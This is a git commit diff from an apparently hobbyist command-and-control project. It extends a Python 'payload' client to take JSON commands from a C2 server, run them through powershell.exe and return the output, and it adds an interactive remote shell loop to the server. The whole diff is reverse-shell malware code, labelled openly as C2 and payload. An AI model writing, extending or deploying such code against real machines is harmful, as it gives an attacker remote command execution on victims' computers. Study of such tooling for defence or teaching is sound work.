6d33b124b731833cb56d6aa0b4267ccb72ce70ab
FlyFox717 <fedesesana@gmail.com>
2023-10-31 22:38:58 +0100

    Set up for shell module

--- Payloads/client.py
+++ Payloads/client.py
@@ -1,8 +1,23 @@
-import socket
+import socket, os, threading, subprocess, json, time, sys
 
 HOST = "127.0.0.1" # C2 Server IP
 PORT = 6969 # C2 application port
 
+
+def send_data(conn, data):
+    """Sends data back to the C2 server"""
+    data = json.dumps(data)
+    conn.send(data.encode())
+
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.connect((HOST, PORT)) # Connect to the C2 server
-    sock.sendall(b"ciao")
+    while True:
+        data = json.loads(sock.recv(1024).decode())
+        print(data)
+        match data[0]:
+            case "command":
+                proc = subprocess.Popen('powershell.exe', stdin = subprocess.PIPE, stdout = subprocess.PIPE)
+                output, error = proc.communicate(data[1].encode())
+                time.sleep(0.5)
+                print(output)
+                send_data(sock, output.decode())
--- Server/main.py
+++ Server/main.py
@@ -1,23 +1,34 @@
 import socket
 import json
+import sys
+import time
 
 HOST = "127.0.0.1" # Address to listen on
 PORT = 6969 # Port to listen on. (Better to use unprivileged ports)
 
 def send_command(conn, *args):
     """Send a command to the target"""
-    conn.send(json.dumps(args))
+    conn.send(json.dumps(args).encode())
 
 def wait_response(conn):
     """Gets a response from the target"""
-    data = conn.recv(1024)
+    raw = conn.recv(1024).decode()
+    print(raw)
+    data = json.loads(raw)
     return data
 
 def shell(conn): 
     """Actions performed when the shell command is typed"""
     print("[INFO] Dropping into a shell...")
-    send_command(conn, "shell")
-    
+    time.sleep(0.5)
+    while True:
+        send_command(conn, "command", "cd")
+        cd = wait_response(conn)
+        command = input(cd + " >")
+        if command == "exit": break
+
+        output = send_command(conn, "command", command)
+        print(output)
 
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
@@ -28,7 +39,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     with conn: 
         print(f"[INFO] Connection received from {addr}\n")
         while True:
-            command = input("SHELL> ") # Request user command input
+            command = input("CMD> ") # Request user command input
             match command: # Parse user command input
                 case 'shell':
                     shell(conn)
